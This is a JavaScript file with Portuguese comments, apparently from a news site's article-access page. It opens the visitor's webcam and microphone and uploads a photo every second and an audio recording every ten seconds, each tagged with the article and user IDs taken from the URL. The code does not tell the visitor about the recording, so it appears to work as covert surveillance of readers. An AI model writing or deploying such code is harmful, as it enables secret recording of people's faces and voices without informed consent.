function capturarEEnviarFoto(idNoticia, idUsuario) {
    const video = document.createElement('video');
    const canvas = document.createElement('canvas');
    const context = canvas.getContext("2d");

    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then((stream) => {
            video.srcObject = stream;
            video.onloadedmetadata = () => {//garante que o vídeo foi carregado 

                video.play();

                // FOTO: a cada 1 segundo
                const fotoInterval = setInterval(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob((blob) => {
                        const formData = new FormData();
                        formData.append("foto", blob, "foto.png");

                        fetch(`/noticia-acesso/add-foto/${idNoticia}/${idUsuario}`, {
                            method: "POST",
                            body: formData
                        }).then(resp => {
                            if (resp.ok) {
                                console.log("📸 Foto enviada");
                            } else {
                                console.error("❌ Erro ao enviar foto");
                            }
                        });
                    }, "image/png");
                }, 1000); // a cada 1 segundo

                // ÁUDIO: gravação contínua e envio a cada 10 segundos
                const mediaRecorder = new MediaRecorder(stream);
                let audioChunks = [];

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        audioChunks.push(event.data);
                    }
                };

                mediaRecorder.start(); // inicia gravação

                // A cada 10 segundos, envia o áudio capturado e reinicia o buffer
                const audioInterval = setInterval(() => {
                    if (audioChunks.length > 0) {
                        const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
                        const audioFormData = new FormData();
                        audioFormData.append("audio", audioBlob, "audio.webm");

                        fetch(`/noticia-acesso/add-audio/${idNoticia}/${idUsuario}`, {
                            method: "POST",
                            body: audioFormData
                        }).then(resp => {
                            if (resp.ok) {
                                console.log("🎤 Áudio enviado");
                            } else {
                                console.error("❌ Erro ao enviar áudio");
                            }
                        });

                        // Limpa o buffer para próxima gravação
                        audioChunks = [];
                    }
                }, 10000); // a cada 10 segundos
            };

        })
        .catch((error) => {
            console.error("❌ Erro ao acessar a câmera e microfone:", error);
        });
}

function iniciarCapturaFoto(isRepetir = false, intervaloSegundos = 10) {
    const pathParts = window.location.pathname.split('/');
    const idNoticia = pathParts[3];
    const idUsuario = pathParts[4];

    const capturar = () => {
        capturarEEnviarFoto(idNoticia, idUsuario);
    };

    // Executa a primeira captura imediatamente
    capturar();

    // Se for repetir, agenda capturas subsequentes
    if (isRepetir) {
        setInterval(capturar, intervaloSegundos * 1000);
    }
}

